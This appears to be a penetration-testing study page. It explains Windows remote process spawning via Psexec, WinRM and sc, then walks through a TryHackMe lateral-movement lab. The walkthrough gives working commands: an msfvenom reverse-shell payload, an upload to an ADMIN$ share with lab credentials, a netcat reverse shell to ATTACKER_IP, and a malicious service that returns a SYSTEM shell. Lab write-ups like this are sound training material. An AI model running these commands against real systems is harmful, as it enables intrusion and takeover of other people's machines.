# Spawning Processes Remotely

Here are some of the methods that attackers use to remotely spawn processes:

***

### <mark style="color:green;">Psexec</mark>

* **Ports:** 445/TCP (SMB)
* **Required Group Memberships:** Administrators

<figure><img src="../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

{% stepper %}
{% step %}
### Authentication

Attacker provides credentials to authenticate remote system
{% endstep %}

{% step %}
### SMB Connection

Psexec connects over SMB (TCP port 445)
{% endstep %}

{% step %}
### Service Creation

Psexec creates and executes `PSEXESVC.exe`  spawning a new service named PSEXESVC
{% endstep %}

{% step %}
### Command Execution

The new service runs with SYSTEM privileges and outputs to the attacker's machine
{% endstep %}
{% endstepper %}

The stdout, stdin and stderr are also managed by the created **Named Pipes**. A named pipe is a special file that allows for Inter-Process Communication (IPC) meaning two processes can **send and receive data** between each other.

The command below spawns a remote cmd:

```
psexec \\TARGET_IP -u Administrator -p Password cmd.exe
```

***

### <mark style="color:green;">WinRM</mark>

* **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
* **Required Group Memberships:** Remote Management Users

Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

Using Powershell:

```powershell
Invoke-Command -ComputerName TARGET -Credential Administrator -ScriptBlock { ipconfig }
```

Using Evil-WinRM:

```bash
evil-winrm -i TARGET -u Administrator -p password
```

***

### <mark style="color:green;">Sc</mark>

* **Ports:**
  * 135/TCP, 49152-65535/TCP (DCE/RPC)
  * 445/TCP (RPC over SMB Named Pipes)
  * 139/TCP (RPC over SMB Named Pipes)
* **Required Group Memberships:** Administrators

`sc` is a command that allows you to create, modify, start and stop Windows services and that includes remotely!

When `sc.exe` is used to manage services **on a remote machine**, it communicates with the **Service Control Manager (SVCCTL)** through **RPC (Remote Procedure Call)** in 2 way&#x73;**:**

{% tabs %}
{% tab title="DCE/RPC" %}
<figure><img src="../../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

1. The client connects to Endpoint Mapper (EPM) and requests the `SVCCTL` service
2. EPM responds with the IP and dynamic port (49152-65535) where `SVCCTL` is listening
3. Client then connects to `SVCCTL` on that dynamic port
{% endtab %}

{% tab title="SMB named pipes" %}
<figure><img src="../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

If lets say RPC is blocked by firewall, sc will try to reach `SVCCTL` through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS)
{% endtab %}
{% endtabs %}

The command below creates a service that opens Calculator:

```
sc \\TARGET create EvilService binPath= "cmd.exe /c calc.exe" start= auto
```

***

***

<figure><img src="../../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

## Task 1

We start at THMJMP2. The goal here is we need to move laterally to THMIIS using `sc.exe` by getting a reverse shell from a spawned process  and get the flag. Initial credentials are given (assume we captured with admin access)

User: `ZA.TRYHACKME.COM\t1_leonard.summers`

Password: `EZpass4ever`

***

First, Generate the payload using msfvenom

```bash
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -o service.exe
```

<figure><img src="../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

`-f exe-service` > Makes the payload behave like a Windows service

Proceed to use the current user's credentials to upload the payload to the ADMIN$ share of THMIIS using `smbclient`

```bash
smbclient -c 'put service.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

<figure><img src="../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

`-c 'put mother.exe'` > Command to upload payload to share

`-W ZA` > Windows domain

Setup the listener to receive the reverse shell

```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT <ATTACKER_PORT>
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on <ATTACKER_IP>:<ATTACKER_PORT>
```

Now, we SSH into the initial setup where the credentials were given when setting up DNS.

<figure><img src="../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Start a listener on another port

<figure><img src="../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

Now we `runas` to spawn a second shell from the user above using `t1_leonard.summers` access token

```
C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1235"
```

<figure><img src="../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

We received a callback from the listener

<figure><img src="../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

Now create a service name with our payload and start it

```
C:\> sc.exe \\thmiis.za.tryhackme.com create <Service_Name> binPath= "%windir%\service.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start <Service_Name>
```

<figure><img src="../../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

Our metasploit listener also received a callback but this time with SYSTEM privileges

<figure><img src="../../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

Successful pivot from THMJMP2 to THMIIS

<figure><img src="../../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

Flag in `t1_leonard.summers` ' Desktop

<figure><img src="../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>
